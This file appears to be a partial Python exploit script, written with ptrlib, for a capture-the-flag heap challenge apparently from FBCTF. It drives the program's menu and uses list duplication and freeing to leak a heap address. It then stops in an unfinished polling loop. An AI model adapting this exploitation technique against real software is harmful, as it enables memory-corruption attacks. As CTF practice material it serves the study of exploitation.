from ptrlib import *
import re
import time

def create(name):
    sock.recvuntil("> ")
    sock.sendline("1")
    sock.sendline(name)

def add(index, value):
    sock.recvuntil("> ")
    sock.sendline("2")
    sock.sendline(str(index))
    sock.sendline(str(value))

def view(index, pos):
    sock.recvuntil("> ")
    sock.sendline("3")
    sock.sendline(str(index))
    sock.recvuntil("into list:\n")
    sock.sendline(str(pos))
    line = sock.recvline()
    r = re.findall(b"(.+)\[(.+)\] = (.+)", line)
    w = int(r[0][2])
    if w < 0:
        w = (0xffffffff ^ (- w - 1))
    return r[0][0], int(r[0][1]), w

def dup(index, name):
    sock.recvuntil("> ")
    sock.sendline("4")
    sock.sendline(str(index))
    sock.sendline(name)

def remove(index):
    sock.recvuntil("> ")
    sock.sendline("5")
    sock.sendline(str(index))

sock = Socket("localhost", 4001)
#sock = Socket("challenges3.fbctf.com", 1343)

# leak heap addr
create("ichiro")
add(0, 0x1111)
add(0, 0x2222)
add(0, 0x3333)
add(0, 0x4444)
dup(0, "jiro")
add(0, 0x5555)
add(1, 0xffff)
addr_heap = (view(1, 1)[2] << 32) | view(1, 0)[2]
dump("addr heap = " + hex(addr_heap))

while True:
    view(0, 0)
    time.sleep(0.1)
